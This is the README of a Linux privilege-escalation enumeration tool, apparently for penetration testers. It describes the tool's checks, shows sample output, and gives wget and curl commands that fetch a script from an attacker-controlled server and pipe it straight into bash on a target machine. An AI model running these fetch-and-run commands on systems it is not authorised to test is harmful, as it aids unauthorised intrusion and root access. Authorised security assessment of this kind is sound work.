# Lintriage

Linux Privilege Escalation Auto-Triage Tool

## What is this?

Lintriage runs the checks you actually need for Linux priv esc - no fluff, just the good stuff. It hits the common vectors and spits out findings in HIGH/MEDIUM/INFO format so you know what to focus on.

## What it checks

- **SUID binaries** - Finds setuid binaries, flags the dangerous ones
- **Writable cron jobs** - Looks for writable cron files/directories
- **Writable systemd services** - Checks for writable service files
- **Linux capabilities** - Finds files with dangerous capabilities
- **Interesting files** - Scans for .bak, .old, .conf and other sensitive files
- **Kernel version** - Checks if your kernel version has known exploits

The output is color-coded and organized by severity (HIGH/MEDIUM/INFO) so you can quickly see what matters.

## Getting started

```bash
git clone <repository-url>
cd Lintriage
```

## Usage

### On your machine (attacker box)

The `lintriage.py` helper serves up the bash script and shows you exactly what commands to run:

```bash
# Show info
python3 lintriage.py info

# Check if build file exists
python3 lintriage.py status

# Start the server (default port 8000)
python3 lintriage.py serve

# Or use a different port
python3 lintriage.py serve --port 8080
```

When you start the server, it'll show you the download URLs and copy-paste ready commands for wget/curl.

### On the target machine

Once the server is running, grab the script on your target:

**wget:**
```bash
wget http://<YOUR_IP>:8000/lintriage.sh -O lintriage.sh
chmod +x lintriage.sh
./lintriage.sh
```

**curl:**
```bash
curl http://<YOUR_IP>:8000/lintriage.sh -o lintriage.sh
chmod +x lintriage.sh
./lintriage.sh
```

**Or just run it directly (one-liner):**
```bash
wget -qO- http://<YOUR_IP>:8000/lintriage.sh | bash
# or
curl -s http://<YOUR_IP>:8000/lintriage.sh | bash
```

The bash script has zero dependencies - just needs standard Linux tools that are already there.

## Output

Findings are split into three levels:

- **HIGH** - Usually exploitable, check these first (red)
- **MEDIUM** - Might be exploitable, worth a look (yellow)
- **INFO** - Just info, might be useful (blue)

## Requirements

**On your machine:** Python 3.6+ to run the helper

**On target:** Just bash and standard Linux tools (find, getcap, uname, etc.). No Python needed.

## Example Output

```
  ██      ██ ███    ██ ████████ ██████  ██  █████   ██████  ███████ 
  ██      ██ ████   ██    ██    ██   ██ ██ ██   ██ ██       ██      
  ██      ██ ██ ██  ██    ██    ██████  ██ ███████ ██   ███ █████   
  ██      ██ ██  ██ ██    ██    ██   ██ ██ ██   ██ ██    ██ ██      
  ███████ ██ ██   ████    ██    ██   ██ ██ ██   ██  ██████  ███████ 
                                                                                                                  
        Linux Privilege Escalation Auto-Triage Tool              
        Focused enumeration without the noise                    


✓ SUID binaries [completed]
✓ Writable cron jobs [completed]
✓ Writable systemd services [completed]
✓ Linux capabilities [completed]
✓ Interesting files [completed]
✓ Kernel version [completed]

┌────────────────────────────────────────────────────────────┐
│  ⚠  HIGH SEVERITY FINDINGS                                 │
└────────────────────────────────────────────────────────────┘

• [1] SUID Binary
   ➜ Dangerous SUID binary found: /usr/bin/find
   └─ Binary: find - Known to be exploitable

╔════════════════════════════════════════════════════════════╗
║                        SUMMARY                             ║
╠════════════════════════════════════════════════════════════╣
║  HIGH:   1  │  MEDIUM: 3  │  INFO:   5  │  TOTAL: 9        ║
╚════════════════════════════════════════════════════════════╝
```

## Files

```
Lintriage/
├── lintriage.py          # Helper tool to serve the script
├── builds/
│   └── lintriage.sh      # The actual enumeration script
├── README.md
└── LICENSE
```

- `lintriage.py` - Run this on your machine to serve the script
- `builds/lintriage.sh` - This is what gets downloaded and run on the target

## Quick start

1. On your machine: `python3 lintriage.py serve`
2. On target: Copy one of the commands it shows you, or use the one-liner
3. Wait for results

That's it. No manual file uploads, no installing dependencies on the target.

## License

See LICENSE file for details.
